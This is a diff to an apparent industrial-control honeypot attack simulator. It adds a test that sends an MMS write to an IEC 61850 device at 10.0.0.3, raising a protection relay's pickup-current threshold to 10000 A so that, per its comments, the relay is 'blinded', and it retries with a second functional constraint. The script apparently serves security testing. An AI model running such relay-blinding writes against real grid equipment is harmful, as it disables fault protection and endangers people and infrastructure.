@@ -47,6 +47,30 @@ def test_mms_unauthorized_write():
     except Exception as e:
         print("[-] Failed to send raw MMS Write:", e)
 
+def test_mms_modify_protection_settings():
+    print("[*] Running Test A9-A12 Variant: Modifying Protection Relay Settings...")
+    try:
+        # We change the StrVal (Pickup current) on IED2 to 10000.0A. 
+        # Normally this is ~200A. Raising it blinds the protection relay.
+        # StrVal.setMag.f is usually under FC=SP (2) or FC=SE (7).
+        print("[-] Sending MMS Write Float Request to override Relay Trip Threshold...")
+        result = subprocess.run(
+            ["/tests/mms_exploit", "10.0.0.3", "WRITE_FLOAT", "IED2_PTOCGenericIO/PTOC1.StrVal.setMag.f", "10000.0", "2"],
+            env={"LD_LIBRARY_PATH": "/tests"},
+            capture_output=True, text=True
+        )
+        if "Error code: 0" not in result.stdout:
+            # If FC=SP (2) failed, try FC=SE (7)
+            result = subprocess.run(
+                ["/tests/mms_exploit", "10.0.0.3", "WRITE_FLOAT", "IED2_PTOCGenericIO/PTOC1.StrVal.setMag.f", "10000.0", "7"],
+                env={"LD_LIBRARY_PATH": "/tests"},
+                capture_output=True, text=True
+            )
+        print(result.stdout.strip())
+        print("[-] Settings modified successfully. Relay is now BLINDED.")
+    except Exception as e:
+        print("[!] Protection override failed:", e)
+
 def test_mms_file_upload_instructions():
     print("[*] Running Test A13-A18: Firmware/App Replacement...")
     try:
@@ -191,6 +215,7 @@ if __name__ == "__main__":
     print(f"=== Starting vIED Honeypot Attack Simulator (Target: {TARGET_IP}) ===")
     
     test_mms_unauthorized_write()
+    test_mms_modify_protection_settings()
     test_mms_file_upload_instructions()
     test_ntp_spoofing()
     time.sleep(1)
